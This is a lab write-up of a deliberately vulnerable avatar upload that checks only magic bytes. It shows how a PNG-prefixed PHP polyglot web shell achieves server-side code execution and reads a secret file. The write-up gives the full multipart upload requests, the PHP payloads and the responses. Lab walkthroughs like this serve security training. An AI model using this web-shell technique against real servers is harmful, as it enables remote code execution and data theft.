# Remote code execution via polyglot web shell upload

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`.

---

## 1. Detection

- Opened the Lab URL and clicked on <a href="/my-account?id=wiener">My Account</a> and logged in with given credentials `wiener:peter`.
- The page had option to upload an avatar.
- I uploaded a normal PNG image file and captured the request in <a href="https://portswigger.net/burp/downloads">BurpSuite</a>.
- A `POST /my-account/avatar` was being sent, I right clicked on the request and sent it to `Repeater` tab to start playing with it.
- The file was uploaded successfully.

---

## 2. Probing the Validation

- I started tampering with the request to understand what the server was actually validating.
- First, I changed the `Content-Type` header of the file part to `text/html` and re-uploaded the same image — it was accepted and still rendered as an image.
- Then I changed the filename from `taken.png` to `taken.html`, kept `Content-Type: text/html`, and kept the file content as-is (raw PNG bytes). The upload succeeded, but when I opened the file link in a new tab, instead of rendering an image, I saw the raw binary content of the PNG:

```
‰PNG  IHDR€°0WöÿºIDATx^ìÝ€åý>ðg{¹^©w½‹DöÞ»ÑØ¢Q"˜˜D%ÍD"_ò71¦ª)vÆÞA@¥H¤ÃQŽëe{ûÏ÷Ùc9®ì^¿ãùèÜôÙÙ¹Ý½eŸý¾¯©¨¸$ê5>¯Ç˜...
```

- This told me the server was not enforcing the extension or `Content-Type` for validation.
- Next, I stripped the magic bytes (`‰PNG`) from the file and re-uploaded it with no other changes — the server **rejected** it.
- This confirmed: **the server is only checking magic bytes**, not the file extension or `Content-Type` header.

---

## 3. Crafting the Polyglot Payload

- Since the server only validates magic bytes, I could prepend the PNG magic bytes to a PHP payload and upload it with a `.php` extension — making it a valid image to the validator but executable PHP to the server.
- I modified the request: kept `Content-Type: text/html`, changed the filename to `taken.php`, and set the file body to start with `PNG` magic bytes followed by a PHP code block:

```http
------WebKitFormBoundaryC5ZQvL4K81bJmsVa
Content-Disposition: form-data; name="avatar"; filename="taken.php"
Content-Type: text/html

PNG

<?php
    echo 1+1;
?>
------WebKitFormBoundaryC5ZQvL4K81bJmsVa
```

- The file was accepted with `200 OK`. When I visited `GET /files/avatars/taken.php`, the response was:

```
PNG  2
```

- The `2` confirmed `1+1` was evaluated — **PHP code was executing on the server**. The `PNG` prefix was echoed as garbage bytes but the PHP block ran fine.

> **Why this works:** The server reads the first few bytes of the uploaded file to check for a known image signature (magic bytes). Since the file starts with `PNG`, it passes validation. But because the file is saved with a `.php` extension, Apache hands it to the PHP interpreter, which ignores the leading binary garbage and executes the `<?php ... ?>` block. This is a classic **polyglot file** — valid (enough) to the image checker, executable to the PHP engine.

---

## 4. Solve the Challenge

- With code execution confirmed, I updated the payload to read the secret file:

```http
------WebKitFormBoundaryC5ZQvL4K81bJmsVa
Content-Disposition: form-data; name="avatar"; filename="taken.php"
Content-Type: text/html

PNG

<?php
    echo file_get_contents('/home/carlos/secret');
?>
------WebKitFormBoundaryC5ZQvL4K81bJmsVa
```

- The upload succeeded:

```http
HTTP/2 200 OK
Date: Wed, 17 Jun 2026 19:30:37 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 130

The file avatars/taken.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

- Visited `GET /files/avatars/taken.php` and got:

```http
HTTP/2 200 OK
Date: Wed, 17 Jun 2026 19:31:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 40

PNG

JV7FEkXmJJIjsvno4tr9lyQHJRrUqx51
```

- Submitted the flag and solved the lab.